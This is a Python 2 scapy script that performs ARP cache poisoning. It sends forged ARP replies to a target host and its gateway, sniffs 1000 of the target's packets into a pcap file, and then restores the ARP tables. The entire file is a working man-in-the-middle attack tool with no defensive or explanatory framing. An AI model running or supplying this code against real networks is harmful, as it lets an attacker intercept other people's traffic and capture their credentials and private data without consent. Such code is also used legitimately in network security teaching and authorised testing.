from scapy.all import *
import os
import sys
import threading
import signal

interface    = sys.argv[1]
target_ip    = sys.argv[2]
gateway_ip   = sys.argv[3]
packet_count = 1000

conf.iface   = interface
conf.verb    = 0

def restore_target(gip, gmac, tip, tmac):
    print "[*] Restoreing target..."
    send(ARP(op=2, psrc=gip, pdst=tip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gmac),count=5)
    send(ARP(op=2, psrc=tip, pdst=gip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=tmac),count=5)

def get_mac(ip):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gip, gmac, tip, tmac, stop_event):
    #poison target
    pt       = ARP()
    pt.op    = 2
    pt.psrc  = gip
    pt.pdst  = tip
    pt.hwdst = tmac

    #poison gateway
    pg       = ARP()
    pg.op    = 2
    pg.psrc  = tip
    pg.pdst  = gip
    pg.hwdst = gmac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while True:
        send(pt)
        send(pg)

        if stop_event.wait(2):
            break

    print "[*] ARP poison attack finished"

    return



print "[*] Setting up %s" % interface

gateway_mac  = get_mac(gateway_ip)
target_mac   = get_mac(target_ip)

print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)
print "[*] Target  %s is at %s" % (target_ip , target_mac )

stop_event   = threading.Event()
poison_thread= threading.Thread(target = poison_target,
                                args   = (gateway_ip, gateway_mac,
                                          target_ip , target_mac ,
                                          stop_event))
poison_thread.start()

print "[*] Starting sniffer for %s packets" % packet_count

filter_rule  = "ip host %s" % target_ip
packets      = sniff(count=packet_count, filter=filter_rule, iface=interface)

wrpcap("example.pcap", packets)

stop_event.set()
poison_thread.join()

restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

